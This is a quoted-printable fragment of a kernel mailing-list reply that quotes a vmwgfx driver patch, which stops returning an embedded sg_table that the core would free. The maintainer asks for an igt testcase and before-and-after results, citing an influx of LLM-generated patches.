m/vmwgfx/vmwgf<wbr>x_gem.c<br>
&gt; index 39f8c4655..a0233729b 100644<br>
&gt; --- a/drivers/gpu/drm/vmwgfx/vmwgf<wbr>x_gem.c<br>
&gt; +++ b/drivers/gpu/drm/vmwgfx/vmwgf<wbr>x_gem.c<br>
&gt; @@ -73,10 +73,13 @@ static struct sg_table *vmw_gem_object_get_sg_tabl=
e(s<wbr>truct drm_gem_object *obj)<br>
&gt;=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0struct vmw_ttm_tt *vmw_tt =3D<br>
&gt;=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0container=
_of(bo-&gt;ttm, struct vmw_ttm_tt, dma_ttm);<br>
&gt;<br>
&gt; -=C2=A0 =C2=A0 =C2=A0 =C2=A0if (vmw_tt-&gt;vsgt.sgt)<br>
&gt; -=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0return vmw_tt-=
&gt;vsgt.sgt;<br>
&gt; -<br>
&gt; -=C2=A0 =C2=A0 =C2=A0 =C2=A0return drm_prime_pages_to_sg(obj-&gt;dev<w=
br>, vmw_tt-&gt;dma_ttm.pages, vmw_tt-&gt;dma_ttm.num_pages);<br>
&gt; +=C2=A0 =C2=A0 =C2=A0 =C2=A0/*<br>
&gt; +=C2=A0 =C2=A0 =C2=A0 =C2=A0 * Do not return &amp;vmw_tt-&gt;sgt: the =
core owns what this returns and<br>
&gt; +=C2=A0 =C2=A0 =C2=A0 =C2=A0 * drm_gem_unmap_dma_buf() sg_free_table()=
s and kfree()s it, but that<br>
&gt; +=C2=A0 =C2=A0 =C2=A0 =C2=A0 * sg_table is embedded in the vmw_ttm_tt =
allocation.<br>
&gt; +=C2=A0 =C2=A0 =C2=A0 =C2=A0 */<br>
&gt; +=C2=A0 =C2=A0 =C2=A0 =C2=A0return drm_prime_pages_to_sg(obj-&gt;dev<w=
br>, vmw_tt-&gt;dma_ttm.pages,<br>
&gt; +=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=
 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 vmw_tt-&gt;dma_ttm=
.num_pages);<br>
&gt;=C2=A0 }<br>
&gt;<br>
&gt;=C2=A0 static int vmw_gem_vmap(struct drm_gem_object *obj, struct iosys=
_map *map)<br>
&gt; --<br>
&gt; 2.43.0<br>
&gt;<br>
<br>
Thank you. Because of the influx of llm patches it&#39;s very hard to<br>
reason about what&#39;s valid and what&#39;s not if it comes without a<br>
reproducible testcase. Could you please add an igt testcase for this<br>
and then include the full igt results for vmwgfx before and after this<br>
change? Same for your other change.<br>
<br>
z<br>
</blockquote></div></div>

--000000000000cca1bc065c27baea--
